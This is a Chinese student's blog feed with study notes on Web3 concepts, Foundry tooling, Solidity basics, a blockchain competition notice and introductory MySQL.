        <content type="html"><![CDATA[<p>最近又发现一个学习网站，正好趁着国庆假期，再把知识又巩固一遍，就写了这篇学习学习笔记记录一下</p><h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><p>以前我们的信息都集中在一个软件上，这造成了，我们的信息就会被泄露，就比如2018年Facebook-剑桥分析公司数据泄露丑闻，数百万Facebook用户的个人信息被不当收集并用于影响政治选举，这就是数据集中控制的风险和后果</p><p>那么web3就出现了，它是建立在区块链技术上的下一代互联网，它强调<strong>权力下放</strong>，这就意味着没有集中的权威机构来管理数据和资源</p><p>在web3的世界里，用户拥有自己创立的内容和数据，摆脱了对传统中心化平台的依赖，由此web3也促进了新的商业模式，例如：<strong>去中性化金融（DeFi）</strong>   <strong>非同质化代币（NFT）</strong>  <strong>去中性化自治组织（DAO）</strong></p><p>它的发展来看：从Web1.0时代的静态网页，到Web2.0的社交互动，再到Web3.0的去中心化智能网络</p><p>Web3 各赛道百花齐放，共同构建一个去中心化、透明化、创新化的数字生态。去中心化金融（DeFi）消除了中介机构，实现了开放式的金融交易和服务；非同质化代币（NFT）赋予了数字资产唯一性和价值；去中心化自治组织（DAO）促进了集体决策和公平管理；去中心化身份（DID）保障了个人身份数据的安全和隐私；社交金融（SocialFi）和游戏金融（GameFi）将传统的社交、游戏活动与经济激励相结合，重新定义了用户参与的价值；基础设施赛道为所有这些创新提供了稳定的技术支持和发展平台。</p><h2 id="web3领域的知识"><a href="#web3领域的知识" class="headerlink" title="web3领域的知识"></a>web3领域的知识</h2><h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p>加密和解密使用同样的密钥，这样就必须双方知道密钥，并且都保证不向外传，但是这样的保密性不高，只要有人得到了密钥，就能解密</p><h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>就是一个人，有俩个密钥，一个公钥，一个私钥，下面将详细解释</p><h3 id="公钥和私钥"><a href="#公钥和私钥" class="headerlink" title="公钥和私钥"></a>公钥和私钥</h3><p>私钥：私钥是随机生成的字符串，通常由一系列字母和数字组成，是用户身份和资产管理的核心，必须严格保密。<br>公钥:公钥由私钥生成，是私钥的配对密钥，可以公开共享，用于验证信息和加密私钥签名的数据。<br>以前没有分清楚公钥和私钥的作用，现在我明白了，就举个例子吧<br>A向B发送一个交易，首先A获得B的公钥，用来对交易加密，B收到交易后用他自己的私钥进行解密，但是公钥是公开的，谁都可以用B的公钥加密交易，冒充A给B发，所以就有数字签名出现了，A在发送消息前用自己的私钥先对交易签名，生成v,r,s,B接受到消息后就可以使用A的公钥进行解密，这使用了非对称加密和数字签名的技术</p><h3 id="defi"><a href="#defi" class="headerlink" title="defi"></a>defi</h3><p>去中心化金融（简称 DeFi）是一种基于区块链技术的金融生态系统。它利用智能合约（可自动执行的程序代码）实现金融服务自动化，同时消除传统金融系统中的银行和经纪人等中介机构。在 DeFi 的世界里，所有交易和服务都是透明的、无需许可的，并且对任何有互联网访问权限的人开放</p><p>与传统的中心化金融（CeFi）相比，去中心化金融在可及性、透明度、安全性、效率、创新性和去中心化方面具有显著优势。</p><ul><li>首先，DeFi 提供无边界金融服务，确保全球用户只要有互联网连接就可以不受地域限制地进行交易。这对于传统银行服务不足或无法使用的地区尤为重要。</li><li>其次，DeFi 利用区块链技术公开记录所有交易，任何人都可以验证和审计这些记录。这种开放性大大提高了系统的透明度和可信度，使用户能够清楚地看到资金的流向，从而减少了隐藏的费用和潜在的不当行为。</li><li>在安全性方面，DeFi 通过先进的加密技术保护用户的资金和交易，大大降低了欺诈和黑客攻击的风险。自动化智能合约还可以确保无缝执行交易，而无需传统金融机构典型的复杂程序和人工审核，从而提高运营效率。</li><li>在创新方面，DeFi 的开放开发平台吸引了来自世界各地的开发者，推动了新的金融产品和服务不断涌现。这种以社区为主导的开发模式鼓励思想交流和快速迭代，加速了金融领域的技术进步。</li><li>最后，与可能面临宕机风险的传统金融机构不同，DeFi 的分布式结构本质上消除了单点控制，增强了系统对故障和攻击的抵御能力。即使某些节点受到攻击，网络仍可持续运行，确保金融服务的连续性和稳定性。<br>一些经典的defi项目，我之前有写过笔记，可以去了解一下</li></ul><h3 id="NFT"><a href="#NFT" class="headerlink" title="NFT"></a>NFT</h3><p>在深入研究非同质化代币（NFT）之前，我们需要了解“可同质化”和“不可同质化”的概念。在加密货币的世界里，可互换性意味着可互换性。例如，如果你有 1 个 BTC，我也有 1 个 BTC，即使这两个 BTC 可能位于不同的钱包地址，但它们具有相同的价值，可以直接交换。这就像用一张 100 美元的钞票换另一张相同面值的钞票一样。另一方面，非同质化意味着独特性和不可替代性。非同质化代币 (NFT) 就是这样独特且不可互换的数字资产。NFT 通常用于证明数字艺术品、收藏品等资产的所有权。</p><p>与同质化代币相比，非同质化代币（NFT）在所有权验证、唯一性、收藏价值、市场流动性和参与度等方面具有独特的价值：</p><ul><li>首先，作为区块链技术的产物，NFT 为数字资产提供了不可篡改的所有权证明。这意味着艺术家和内容创作者可以确保他们的原创作品得到合法认证和追踪，从而保护他们的知识产权。</li><li>其次，由于每个 NFT 都是不可替代的，其固有的稀缺性成为其重要的价值来源。这种稀缺性，尤其是对于独特的艺术品而言，赋予了 NFT 极高的收藏价值。</li><li>此外，尽管 NFT 不可替代，但它们仍可以在全球多个平台上买卖和交易，从而为其提供流动性。随着市场的不断增长，这种流动性正在稳步增加。</li><li>最后，一些 NFT 项目允许持有者对项目的发展进行投票或提供社区特定的福利。这增强了用户体验，使 NFT 不仅仅是一种收藏品，而是一个拥有社区和生态系统的活跃项目。</li></ul><h3 id="DAO"><a href="#DAO" class="headerlink" title="DAO"></a>DAO</h3><p>一个去中心化自治组织（DAO）是基于区块链技术的组织形式，通过智能合约自动执行组织的规则和决策。与传统公司不同，DAO 缺乏管理层和中央权威；所有决策都通过成员投票或预定算法做出。成员通常持有赋予他们投票权的代币，使他们能够直接参与组织的治理，例如提出提案、决定项目方向和分配资金。</p><p>与传统公司相比，DAO 在透明度、信任要求、运营效率、参与式民主和安全性方面具有显著优势。</p><ul><li>首先，DAO 内的所有决策过程和金融交易都公开记录在区块链上，任何外部审计师都可以轻松验证，从而提高了组织的透明度。</li><li>其次，DAO 内部成员之间的交互是通过代码来实现的，成员​​只需要信任智能合约代码本身，而不需要像传统公司那样信任个别领导或者一个中心化的团队。</li><li>此外，由于智能合约可以自动执行任务，这减少了手动处理的需要，消除了许多不必要的中介，并提高了组织运营的效率。</li><li>此外，DAO 允许每个持有代币的成员参与决策，促进更加民主的决策过程，并确保组织真正由社区成员驱动。</li><li>最后，区块链技术的使用增强了 DAO 的安全性，因为它依靠加密和共识算法来保护数据和资产，从而在很大程度上防止外部攻击和内部滥用。</li></ul><h3 id="Web3钱包"><a href="#Web3钱包" class="headerlink" title="Web3钱包"></a>Web3钱包</h3><p>Web3 钱包是一种专为与 Web3 技术（去中心化网络）集成而设计的数字货币钱包。与传统数字货币钱包不同，Web3 钱包允许用户与去中心化应用程序 (DApp) 交互、签署交易并管理其加密资产，而无需依赖中心化第三方。这些钱包通常支持多种加密货币，并提供安全的私钥管理功能，以确保用户资金的安全。</p><p>在 Web3 世界中，一些流行的钱包应用程序因其安全性、易用性和功能性而脱颖而出，成为用户的首选。以下是一些流行的 Web3 钱包：</p><ul><li>MetaMask：MetaMask 是最著名的以太坊钱包之一。它是一个浏览器扩展和移动应用程序，允许用户在网络浏览器中轻松访问以太坊 DApp 并管理其加密资产。</li><li>Trust Wallet：Trust Wallet 是一款安全的移动钱包应用程序，支持多种加密货币，包括以太坊和比特币。它提供了用户友好的界面，并支持与 DeFi 应用程序集成。</li><li>Coinbase 钱包：Coinbase 钱包是加密货币交易平台 Coinbase 推出的一款钱包应用，支持以太坊和 ERC-20 代币，内置 DApp 浏览器。</li><li>币安链钱包：币安链钱包是加密货币交易平台币安推出的钱包应用，旨在兼容币安智能链（BSC）并支持多种加密货币和DApp。</li><li>Trezor：Trezor 是一款以高安全性和便携性著称的硬件钱包。它支持多种加密货币，包括比特币和以太坊，是安全存储加密资产的理想选择。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF区块链技术与应用创新竞赛</title>
      <link href="/2024/09/25/CCF%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E5%88%9B%E6%96%B0%E7%AB%9E%E8%B5%9B/"/>
      <url>/2024/09/25/CCF%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E5%88%9B%E6%96%B0%E7%AB%9E%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="参赛队伍最多4人，需要一名指导老师"><a href="#参赛队伍最多4人，需要一名指导老师" class="headerlink" title="参赛队伍最多4人，需要一名指导老师"></a>参赛队伍最多4人，需要一名指导老师</h3><h3 id="报名时间：截止到2024年9月30号"><a href="#报名时间：截止到2024年9月30号" class="headerlink" title="报名时间：截止到2024年9月30号"></a>报名时间：截止到2024年9月30号</h3><h3 id="提交作品：截止到2023年10月31号-网址https-btc-ccf-org-cn"><a href="#提交作品：截止到2023年10月31号-网址https-btc-ccf-org-cn" class="headerlink" title="提交作品：截止到2023年10月31号 网址https://btc.ccf.org.cn"></a>提交作品：截止到2023年10月31号 网址<a href="https://btc.ccf.org.cn/">https://btc.ccf.org.cn</a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>foundry的使用和安装</title>
      <link href="/2024/09/22/foundry%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%AE%89%E8%A3%85/"/>
      <url>/2024/09/22/foundry%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>上次那个<a href="https://updraft.cyfrin.io/">网站</a>,里面有讲foundry，虽然以前学习过，但是还是没能具体学习过，只会一些测试的用法，其他高深的用法还没有了解到，借此机会再次学习一下，就写了这个笔记</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>推荐这个网站<a href="https://book.getfoundry.sh/">Foundry-Book</a>;<br>安装完成后，在终端使用指令：Forge –version 查看有没有安装好，如果没有，就删除从头再来一遍</p><p>我们使用的是windows的系统就要去找属于window安装教程（我就反复安装，吃了很多亏），如果你想使用windows上的子系统Linux,就可以在你的终端使用 wsl –install ,然后重启安装即可</p><h2 id="使用-（forge-）"><a href="#使用-（forge-）" class="headerlink" title="使用 （forge ）"></a>使用 （forge ）</h2><p>最开始我还没有了解到怎么自己用Foundry全是从仓库 git clone 下来，它自带Foundry,就不需要自己构建文件夹。现在就介绍一下怎么构建一个文件夹包含Foundry测试框架。（注意我们使用的是VSCODE这个软件，非常好用）</p><ul><li>首先创建一个文件夹，在git base终端上输入 forge init 文件夹名字</li><li>进入文件夹 cd 文件夹名字 </li><li>再构建项目 forge build 或则 forge compile</li><li>测试时使用 forge test 如果要测试，测试合约中的一个测试函数，是可以使用过滤条件方法：forge test –match-contract 测试合约名 –match-test 测试函数,也可以使用路径测试$ forge test –match-path test&#x2F;ContractB.t.sol</li></ul><h2 id="cast"><a href="#cast" class="headerlink" title="cast"></a>cast</h2><p>一些Cast的指令：</p><ul><li>获取当前链的ID：cast chain-id</li><li>获取当前客户端版本：cast client</li><li>获取当前gas价格：cast gas-price</li><li>查询最新的区块号：cast block-number</li><li>获取当前的网络基础费：cast basefee</li><li>获取block的详细信息：cast block</li><li>获取区块的时间戳信息：cast age</li><li>查询特定的以太坊账户地址：cast balance 地址   如果不知道地址，就使用ENS查询：cast balance vitalik.eth</li><li>查看源代码：cast etherscan-source 地址</li></ul><h2 id="anvil"><a href="#anvil" class="headerlink" title="anvil"></a>anvil</h2><p>它可以提供一个方便测试和开发的以太坊节点<br>使用anvil指令，它可以输出账户，私钥，链ID，基本费用等<br>通过使用anvil-h,可以查看anvil所有的配置选项<br>使用anvil -a 数量，可以生成指定的数量开发账户</p><h2 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h2><p>Chisel是一个Solidity REPL,用于编写和测试Solidity代码片段，它提供了一个用于编程和执行ASolidity代码的交互式环境</p><h2 id="Forge-Std"><a href="#Forge-Std" class="headerlink" title="Forge Std"></a>Forge Std</h2><p>它是Forge标准库，为Foundry框架提供了丰富的辅组合约，简化和加速编写智能合约测试的过程并提升用户体验<br>使用Forge Std 只需要在测试合约导入Test.sol并继承Test</p><p>核心功能：<br>访问Hevm:通过vm实例直接使用，cheatcode模拟各种区块链状态和行为</p><blockquote><p>Hevm是DappHub团队开发的以太坊虚拟机实现，专门用于测试和调试智能合约，它是一个命令行工具，可以模拟以太坊网络的行为，允许开发人员在本地执行测试和调试它们的合约，而无需连接到实际的以太坊网络<br>断言和日志：从Dappsys Test 继承，具有断言功能和一Hardhat为风格的日志记录<br>标准库功能：Forge Std 提供的标准库包括各种实用的工具和功能，例如，向指定账户发送代币</p></blockquote><p>在Forge标准库的测试合约中，通过vm实例可以方便的访问作弊码<br>例如：身份转化：vm.prank;使用vm.prank()函数，我们可以暂时切换调用者的身份</p><h2 id="编写测试合约"><a href="#编写测试合约" class="headerlink" title="编写测试合约"></a>编写测试合约</h2><p>必要工作，导入：import “forge-std&#x2F;Test.sol”<br>setUP函数，是一个可选函数，在运行测试用例之前调用，用于初始化测试环境<br>以test为前缀的函数将被识别为测试用例并执行<br>testFail函数，用于指示预期的测试失败，如果此函数未触发还原，则测试失败</p><p>还有一些高级的测试技术：expectRevert：它是进行精准的错误处理，例如,vm.expectRevert(Some.Error.selector) &#x2F;&#x2F;可触发SomeError一些错误</p><p>共享设置：通过创建抽象合约并在测试合约中继承它，可以设置共享：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abstract contract SetupHelper &#123;</span><br><span class="line">    // Shared setup codes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyTest is Test, SetupHelper &#123;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // Shared setup</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过共享设置可以避免在每个测试合约中重复相同的初始化代码，提高代码的可重用性和可维护性</p><p>导入文件，用<br>import “forge-std&#x2F;Test.sol”<br>这个是必要的</p>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链知识巩固</title>
      <link href="/2024/09/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9F%A5%E8%AF%86%E5%B7%A9%E5%9B%BA/"/>
      <url>/2024/09/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9F%A5%E8%AF%86%E5%B7%A9%E5%9B%BA/</url>
      
        <content type="html"><![CDATA[<p>最近别人分享了一个网站，对于一些知识巩固我觉得挺好的</p><p>网站链接我就放在<a href="https://updraft.cyfrin.io/">这里</a></p><p>学习这个网站，我就在这个博客上分享一些我的笔记</p><h2 id="一，基本常识"><a href="#一，基本常识" class="headerlink" title="一，基本常识"></a>一，基本常识</h2><p>1，Oracle: 就是充当区块链与外部世界联系的中介，允许智能合约与真实世界交互数据<br>2，Layer2: 它是构建在Laryer1之上的技术，它可以提高区块链交易的扩展性和效率，它通常在交易之外执行，就是为了避免交易拥挤和一些费用产生，如比特币闪电网络<br>3，DAPP：去中心化的应用，通常在区块链上运行，就类比我们现实生活中的app，就是应用<br>4，智能合约：它使自动执行的合约，在区块链上运行<br>5,web3: 它是一个未获许可依赖于去中心化的，也是一个术语，它开创了一个抗审查和透明协议和交易的一个领域<br>6，Chainlink: 它与区块链上的预言机，它通过链上的逻辑和链下的数据和计算，确保这个逻辑和这个数据保持去中心化<br>7，一个区块包括，区块头，区块体</p><blockquote><p>区块头：nonce(交易的计数),前一个哈希值（注意：创世区块没有父哈希值）时间戳，三个树根（状态树根：记录所有账户的余额，信息等，交易树根，收据树根，币基（识别矿工的地址），难度目标（表示挖矿的难度）</p></blockquote><blockquote><p>区块体：包含了这个区块的所有交易哈希值</p></blockquote><p>8，以以太坊为例：从上到下分为：区块链，区块，交易</p><blockquote><p>交易：一个账户向另一个账户发送信息的行为，当发起交易时，以太坊客户端或者钱包会生成交易数据.交易数据包括：nonce(发送方的交易数量)，gasPrice(发送方愿意支付的gas费用)，gasLimit(发送方设置本次最大的gas费用)，to(接收方的地址)，value(要发送的钱)，data(智能合约的字节码)，v r s (交易的签名，又发送方的私钥产生)<br>9，软硬分叉：从字面上理解，就是一个妥协，一个强硬，区块链上的软硬分叉正是因为时代的更新，链上出现了分歧，那么如何解决呢，这是就出现了分叉，从项目上来说，一个项目的分叉（fork），分为一个子项目，那么开发人员就会分别进行这俩个项目，但是区块链上，就不同，就出现了俩种概念</p></blockquote><ul><li>软分叉：向前兼容，旧版本接受新版本的东西，但是在旧版本的算力要大于51%，才能产生软分叉，最后链比较长的保留</li><li>硬分叉：不兼容，旧版本和新版本是完全分开的，它不需要算力大于51%（因为即使旧版本的链长于新版本，但是也不影响新版本，因为新版本不会接受旧版本的东西，而旧版本夜也不会接受新版本的东西）,直接产生硬分叉</li></ul><h2 id="二，solidity的知识查漏补缺"><a href="#二，solidity的知识查漏补缺" class="headerlink" title="二，solidity的知识查漏补缺"></a>二，solidity的知识查漏补缺</h2><p>1，我感觉学了Java的话会很好理解。<br>2，使用结构体时，采用实例化对象，如果对象很多，就采用动态数组，这样就比较方便<br>  eg,定义一个名Person的结构体，用Person[] list_of_people ,那么list_of_people数组就可以储存多个Person对象<br>3，注意到了一个智能问答小助手，名为<a href="https://www.phind.com/search?home=true">phind</a>,就是可以用它来检查你的合约是否缺逗号问题啥的<br>4，数据储存：calldata，它是只能读，不能调用使用。但是在合约中内存memory可以允许读写，让变量改变在函数中，为了修改calldata我们必须先将它储存到内存memory中。calldata和memory，都是临时储存变量。Storage储存变量，它是持久的储存在区块链上，被外部调用时会保留它们的值，任何在函数外部声明的变量都会隐式的转化储存变量，但是不能在函数中定义使用Storage,只能使用calldata和memory。<br>5，映射，在前面我们也了解到，用动态数组储存Person对象，但是如果有很多对象，而我们要找其中一个，就必须从头历遍，这样就会佷麻烦，所以就出现了映射，构造一个映射对象，将一个变量和另一个变量联系起来，提供噶我们的查找效率<br>6，合约实例部署，使用new关键字，类似于java的理解。首先你将要部署的合约A和我们的工厂合约B放在一起，然后在工厂合约B中用A定义a，再定义一个函数create，里面写a&#x3D;new A();这样一个合约实例就部署出来了，没使用create的时候，可以看见a的地址为0，使用后就可以发现a就有地址了，也可以说是，我们把合约A部署出来了，还有一种简单的方法，采用import关键字，这样就可以不用把合约A和合约B写在一起了，直接就是improt”.&#x2F;A”</p><blockquote><p>import的使用方法：如果要导入的合约只包含一个合约，就可以直接使用 import”.&#x2F;“,如果是要导入的合约中包括很多种合约，然后你要使用哪种合约，就在{}里写，在” “写来源，就是大合约，import {A,B} from “.&#x2F;A”;</p></blockquote><p>7，继承于重写：俩个关键字 override，virtual，例如A is B{}；A合约继承B合约，我们要修改A中继承B合约的函数，那么，我们就要在A合约中要修改的函数加上override关键字，在B合约被修改的函数中加上vritual关键字，这样就不会报错<br>8，一个可以计算，wei,Gwei,Ether,之间的转化的工具：<a href="https://eth-converter.com/">Converter</a>;<br>9,gas:交易所产生的手术费，如果一个交易被revert了，那么它的gas就不会返回，为了解决这个问题，以太坊就有一个功能，自己设置能承担的最大gas费用<br>10，库：真的是查漏补缺了，这个库，我还是第一次了解到，库就是为了简化智能合约，使用Library关键字，定义一个Math的库，Library Math{};里面就放函数，在其他合约中可以直接使用库.函数名，直接进行调用，或者使用use for ,例如要在合约中uint类型的变量可以使用Math库，就直接use Math for uint;这样合约中的uint类型的变量就可以使用Math库中的函数，uint类型.函数名，（注意的先使用import导入库）<br>11，注意合约的solidity的版本，在0.6版本时，没有对溢出的一个检查，但是使用SafeMath.sol可以对它进行检查。在solidity版本0.8以上时，它有检查上溢和下溢的功能，所以就不需要使用SafeMath.sol<br>12,重置阵列：使用new关键字，即将每个元素都重置为零，例如：fouder &#x3D; new address<a href=""></a>;还有一种delete.直接删除变量的值<br>13，modifier:修饰器，如果合约较长，而我们又必须每个检查合约的所有者，使用require的话会很繁杂，所以就有修饰器了，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modifier onlyOwner&#123;</span><br><span class="line">  require(msg.sender == onwer,&quot;Sender is not owner&quot;);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里有个_,如果函数使用了onlyOwner的修饰符，那么就会先执行_以前的代码，如果成功，再执行函数中的代码<br>14，自定义错误：从solidity的0.8.4开始，引入了自定义的错误，用于节省Gas并提高更加具体的错误信息，revert用于手动触发异常，例如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdraw (uint amount )&#123;</span><br><span class="line">  if(amount&gt;balance)&#123;</span><br><span class="line">    revert (&quot;Insufficient Balance&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而自定义错误，用于提供更详细和节省Gas的错误信息，例如:error InsufficientBalance(uint requested,uint available);使用的时候用revert即可：revert InsufficientBalance(requested:amount,available:balance);<br>15，receive(): 适用于合约中有它，且没有msg.data的存在，而fallback()就是相反<br>16，一些有用的小助手<br><a href="https://chatgpt.com/">ChatGPT</a>;<br>谷歌开发的一个智能软件：<a href="https://gemini.google.com/app">Gemini</a>；<br>一个社区的检索问题：<a href="https://ethereum.stackexchange.com/">Ethereum-Stack-Exchange</a><br>一个社区的全球交流平台：<a href="https://stackoverflow.com/">stackoverflow</a>;<br>web一个知识构建平台：<a href="https://www.peeranha.io/get-started">Peerhana</a>;</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&#39;数据库原理及应用进阶&#39;</title>
      <link href="/2024/09/18/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E8%BF%9B%E9%98%B6/"/>
      <url>/2024/09/18/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1><h2 id="MySQL内置函数"><a href="#MySQL内置函数" class="headerlink" title="MySQL内置函数"></a>MySQL内置函数</h2><p>一，含义：是指一段可以直接被另一段程序调用的程序或代码</p><p>二，分类：</p><ul><li><p>字符串函数 （使用时，前面加select）eg,select concat（’he’,’DE’）</p><ul><li>CONCAT（S1,S2,S3）：字符串拼接，将S1,S2,S3拼接成一个字符串</li><li>LOWER（str）：将字符串str全部转化为小写</li><li>UPPER(str) : 将字符串str全部转化为大写</li><li>LPAD（str,n,pad）:左填充，用字符串pad对str的左边进行填充，达到n个字符串的长度</li><li>RPAD (str,n,pad) :右填充，用字符串pad对str的右边进行填充，达到n个字符串的长度</li><li>TPIM（str）：去掉字符串头部和尾部的空格</li><li>SUBSTRING(str,start,len):返回从字符串str从start位置起的len个长度的字符串</li><li>例如，如果要单个工号前面添加0000，就使用update 表名 set workno &#x3D; lpad(workno,5,’0’)</li></ul></li><li><p>数值函数</p><ul><li>CEIL(x):向上取整</li><li>FLOOR（x）:向下取整</li><li>MOD (x,y): 返回x&#x2F;y的模</li><li>RAND（）：返回0-1内的随机数</li><li>ROUND（x,y）：求x四舍五入的值，暴露y位小数   </li><li>例如随机生成一个6位数的验证码，select lpad（round(rand()<em>1000000,0)，6，’0’）,首先进行生成0-1的随机数，然后乘以1000000就变成了一个六位数带有小数的数，在用round（）四舍五入消除小数，注意，如果是0.012345</em>1000000就会只有5位数，所以我们要进行填充，使用lpad或者rpad都可以</li></ul></li><li><p>日期函数</p><ul><li>CURDATE()：返回当前日期</li><li>CURTIME(): 返回当前时间</li><li>NOW(): 返回当前日期和时间</li><li>YEAR(date)：获取指定date的年份</li><li>MONTH(date): 获取指定date的月份</li><li>DAY（date）：获取指定date的日期</li><li>DATE_ADD(date,INTERVAL expr type):返回一个日期&#x2F;时间值加上一个时间间隔expr后的时间值</li><li>DATEDIFF(date1,date2):返回起始时间date1,和结束时间date2之间的天数</li><li>例如，从当前日期往后推70天，select date_add(now(),INTERVAL 70 DAY);查询员工入职的天数并降序排序，select name datediff(curdate(),entrydate) as ‘entrydays’ from 表 order by entrydays desc;使用datediff函数，为了方便排序，用as 给计算的天数起个别名，方便order by 使用</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 课程学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库原理及应用基础</title>
      <link href="/2024/09/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2024/09/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>1，数据是数据库储存的基本对象，而数据库则是长期储存在计算机中，有组织，可共享的大量数据的集合<br>   基本特点：永久储存，有组织，可共享，冗余度小，易扩展<br>2，一些基本模型术语：</p><ul><li>关系（r）：就是一个整体的表，可对关系的描述:关系名 (属性1，属性2…..)；关系名就是表名；<ul><li>关系完整性约束条件：实体，参照，用户定义完整性</li></ul></li><li>属性：表中的一列为一个属性</li><li>域：属性的取值范围，一个具有相同类型的值集合</li><li>元组（t）：表中的一行</li><li>主码：也叫码键，表中的某个属性组，它可以唯一确定一个元组，就是一个比较特殊可以用它来确定唯一的值，有点类似于c中的指针；</li><li>分量：元组中的一个属性值</li><li>关系模式：对关系的描述，也叫联系<br>3，数据库系统里有三种模式：<br>a,模式（逻辑模式，概念模式）：数据库中的全体数据逻辑结构和特征的描述，与物理储存的细节和硬件环境，与具体的应用程序，开发环境及高级程序设计语言无关，它是数据库系统模式的中间层<br>b，外模式（子模式，用户模式）：数据库用户使用的局部数据的逻辑结构和特征的描述，是与某一应用有关的数据的逻辑表示，<strong>每个用户</strong>只能看见和访问对应的外模式中的数据，用户只能与外模式建立联系<br>c，内模式（储存模式，物理模式）：是数据物理结构和储存方式的描述，是数据在数据库内部的表示方式：记录的储存方式，索引的组织方式，数据是否压缩储存，数据是否加密，数据储存记录记录结构的规定<blockquote><p>用户-外模式-模式-内模式</p></blockquote></li></ul><p>4，二级映像，三级模式<br>4，<strong>E-R图</strong>：实体用方框，属性用椭圆，关系用菱形</p><hr><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="基本含义："><a href="#基本含义：" class="headerlink" title="基本含义："></a>基本含义：</h3><p>数据模型组成的三要素：数据结构，数据操作，数据的完整性约束条件<br>数据库(DB)：储存数据的仓库<br>数据库管理系统（DBMS）<br>数据库系统（DBS）：包含了数据库和数据库管理系统<br>型：对某一类数据的结构和属性的说明，值：对型的一个具体赋值<br>笛卡尔积：域的相乘，就是域之间的排列组合<br>基数：一个域允许的不同取值的个数。如域d1,的基数为2，域d2的基数为3，则总基数为2*3&#x3D;6；<br>MySQL: 操纵何管理数据库的软件，下载安装后，在终端打开，用：net start mysql80,停止用：net stop mysql80<br>MySQL数据库模型：<br>1，关系型数据库（RDBMS）：建立在关系型模型基础上，由多张相互连接的二维表组成的数据库<br> <a href="http://www.mysql.com/">下载安装MySQL</a><br> 1,登录数据库命令：cd  C:\Program Files\MySQL\MySQL Server 8.0\bin（由于我配置了环境变量，所这步可以省略）<br> 2, 客户端连接，输入mysql -h localhost -u root -p,进入数据库,也可以直接在开始直接打开MySQL的命令提示板输入密码即可<br> 3,输入show databases; 查看当前数据库列表<br> 4,退出执行命令：exit或者quit</p><blockquote><p>一些专业的名词解释：1，索引：加快查询速度的有效方式，用户可以在基本表上建立一个或者多个索引，以提供存取路径，索引是属于内模式的范畴。唯一的索引：使用UNIQUE关键字，每个索引值对应唯一一条数据记录 2，视图：视图是从一个或者几个基本表导出的表，数据库只存在视图的定义而不是存放视图对应的数据，基本表中的数据发生变化，从视图查询出的数据也会随之变化。</p></blockquote><h3 id="SQL："><a href="#SQL：" class="headerlink" title="SQL："></a>SQL：</h3><p>SQL：是用于管理数据库的标准化编程语言，它用于查询，更新，插入和删除数据库中的数据，操作数据库的语言，不管什么数据库管理系统（DBMS），SQL都实用<br>以下所写都是用的关系模型；</p><h4 id="一，SQL的通用语法："><a href="#一，SQL的通用语法：" class="headerlink" title="一，SQL的通用语法："></a>一，SQL的通用语法：</h4><p>a，可单行或多行书写，一分号结尾<br>b,可以使用空格或者缩进来增强语句的可读性<br>c,MySQL数据库的SQL语句部区分大小写，关键字建议大写<br>d,注释：</p><ul><li>单行注释：– 注释内容或 #注释内容（MySQL特有）</li><li>多行注释：&#x2F;* 注释内容*&#x2F;</li></ul><h4 id="二，SQL的分类："><a href="#二，SQL的分类：" class="headerlink" title="二，SQL的分类："></a>二，SQL的分类：</h4><h5 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h5><p>1，DDL：数据定义语言，用来定义数据库对象（数据库，表，字段）</p><p>a,DDL-数据库操作：</p><ul><li>查询：<ul><li>查询所有数据库：SHOW DATABASES；</li><li>查询当前数据库：SELECT DATABASE();</li></ul></li><li>创建：<ul><li>CREATE 